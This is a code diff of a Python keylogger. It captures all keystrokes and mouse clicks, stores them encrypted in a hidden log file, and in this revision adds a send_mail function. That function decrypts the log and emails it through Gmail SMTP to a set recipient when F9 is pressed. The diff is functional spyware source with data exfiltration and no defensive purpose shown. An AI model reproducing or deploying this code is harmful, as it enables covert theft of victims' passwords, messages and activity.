@@ -1,11 +1,26 @@
+# My resources
+from constants import *
+from utils import *
+
+# Site-packages
+from playsound import playsound
 from pynput.keyboard import Listener as Keyboard_listener, Key
 from pynput.mouse import Listener as Mouse_listener, Button
-from utils import *
-from threading import Thread
-from send_mail import send_mail
-from constants import LOG_FILE, HIDE_DIR
+
+# stdlibs
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 from os.path import join
 from pickle import load, dump
+from smtplib import SMTP
+from ssl import create_default_context
+
+
+def write_to_log(s: str) -> None:
+    """
+    Write encrypted data to the log file.
+    """
+    dump(fernet.encrypt(s.encode("utf-8")), log_f)
 
 
 def keyboard_press(key: Key) -> None:
@@ -18,22 +33,21 @@ def keyboard_press(key: Key) -> None:
 
     # Check if it's an alphanumeric key
     try:
+        # Check if it's a combination key - goes with Ctrl
         try:
-            # Check if it's a combination key - goes with Ctrl
             key = CHARS[CODES.index(str(key).replace("'", ""))]
             key = f"「{key}」"
 
-        # This can cause AttributeError (if it's not an alphanumeric key)
+        # This can cause ValueError (if it's not a combination key)
         except ValueError:
-            key = str(key.char)
+            key = key.char
 
-    # Else it's a special key
+    # This can cause AttributeError (if it's a special key)
     except AttributeError:
 
         # Press F9 -> send mail AND terminate keylogger
         if key == Key.f9:
             write_to_log(f"\n\n「Keylogger terminated {get_time(day=True)}」")
-            log_f.close()
             exit_ = True
             send_mail()
             return False
@@ -73,31 +87,61 @@ def mouse_click(x, y, button, pressed) -> None:
         else:
             button = "R" if (button == Button.right) else "M"
 
-        s = "\n「{:4d} {:4d} {} {}」 ".format(x, y, button, get_time())
-        write_to_log(s)
+        # Max dim: eg.1920, 1080 -> Each of them has 4 digits
+        # :>4d: Right aligned text with width=4
+        write_to_log(f"\n「{x :>4d} {y :>4d} {button} {get_time()}」 ")
 
 
-def keyboard():
+def send_mail() -> None:
     """
-    Keyboard thread.
+    Send keylogger data through Gmail.
     """
-    with Keyboard_listener(on_press=keyboard_press) as keyboard_listener:
-        keyboard_listener.join()
+    try:
+        # Change the position to the start of file
+        log_f.seek(0)
 
+        # Read beyond end of the log file
+        try:
+            body = ""
+            while True:
+                # Decrypt the log file
+                body += fernet.decrypt(load(log_f)).decode()
 
-def mouse():
-    """
-    Mouse thread.
-    """
-    with Mouse_listener(on_click=mouse_click) as mouse_listener:
-        mouse_listener.join()
+        except EOFError:
+            # New line character in HTML is the `<br>` tag,
+            # space character in HTML is `&nbsp;`
+            body = body.replace("\n", "<br>").replace(" ", "&nbsp;")
 
+            # Change font size and font face
+            # by embedding it into a HTML template
+            body = f'<font size="{FONT_SZ}" face="{FONT_FACE}">{body}</font>'
 
-def write_to_log(s: str) -> None:
-    """
-    Write data to the log file.
-    """
-    dump(fernet.encrypt(s.encode("utf-8")), log_f)
+        # Initialize and login gmail server
+        server = SMTP(host="smtp.gmail.com", port=587)
+        server.ehlo()
+        server.starttls(context=create_default_context())
+        server.ehlo()
+        server.login(user=SENDER, password=SMTP_PASSWORD)
+
+        # Initialize message
+        message = MIMEMultipart()
+        message["Subject"] = f"Keylogger {get_time(day=True)}"
+        message["From"] = SENDER
+        message["To"] = RECIPIENT
+        message.attach(MIMEText(body, "html", "utf-8"))
+
+        # Send message and log out
+        server.send_message(message)
+        server.quit()
+
+        # After sending the mail successfully,
+        # delete all data in the log file and close it
+        log_f.truncate(0)
+        log_f.close()
+
+    # Play a sound if exists any error
+    except:
+        playsound(FAIL_SOUND)
 
 
 if __name__ == "__main__":
@@ -118,14 +162,15 @@ if __name__ == "__main__":
     )
 
     # Initialization
+    with open("key.pkl", "rb") as key_file:
+        fernet = load(key_file)
     exit_ = False
-    fernet = load(open("key.pkl", "rb"))
-    log_f = open(join(HIDE_DIR, LOG_FILE), "ab")
+    log_f = open(join(HIDE_DIR, LOG_FILE), "ab+")
     write_to_log(f"\n\n「Keylogger started {get_time(day=True)}」\n")
 
-    # Create thread
-    keyboard = Thread(target=keyboard)
-    mouse = Thread(target=mouse)
+    # Create threads
+    keyboard = Keyboard_listener(on_press=keyboard_press)
+    mouse = Mouse_listener(on_click=mouse_click)
 
     # Start both threads
     keyboard.start()
